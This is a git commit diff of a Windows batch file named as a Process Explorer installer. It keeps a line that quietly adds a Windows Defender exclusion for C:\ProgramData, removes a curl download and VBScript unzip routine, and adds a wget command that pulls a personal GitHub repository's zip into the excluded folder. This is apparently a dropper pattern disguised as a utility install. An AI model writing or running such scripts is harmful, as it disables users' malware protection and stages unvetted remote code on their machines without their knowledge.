34f22e78e1c88e7d49053b17a3ac129ca4746b91
brittojo7n <sjbritto2003@gmail.com>
2023-06-24 22:44:28 +0530

    asdasd

--- processexplorer-install.bat
+++ processexplorer-install.bat
@@ -1,28 +1,6 @@
 @echo off
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\ProgramData"
-powershell iwr -uri 'https://curl.se/download/curl-8.1.2.zip' -outfile '%temp%\curl.zip'
-
-setlocal
-cd /d %~dp0
-Call :UnZipFile "C:\ProgramData" "%temp%\curl.zip"
-exit /b
-
-:UnZipFile <ExtractTo> <newzipfile>
-set vbs="%temp%\_.vbs"
-if exist %vbs% del /f /q %vbs%
->%vbs%  echo Set fso = CreateObject("Scripting.FileSystemObject")
->>%vbs% echo If NOT fso.FolderExists(%1) Then
->>%vbs% echo fso.CreateFolder(%1)
->>%vbs% echo End If
->>%vbs% echo set objShell = CreateObject("Shell.Application")
->>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
->>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
->>%vbs% echo Set fso = Nothing
->>%vbs% echo Set objShell = Nothing
-cscript //nologo %vbs%
-if exist %vbs% del /f /q %vbs%
-
-curl.exe -fSLo C:\ProgramData\master.zip https://github.com/brittojo7n/ProcessExplorer/archive/refs/heads/master.zip
+wget -O C:\ProgramData\master.zip https://github.com/brittojo7n/ProcessExplorer/archive/refs/heads/master.zip
 
 setlocal
 cd /d %~dp0
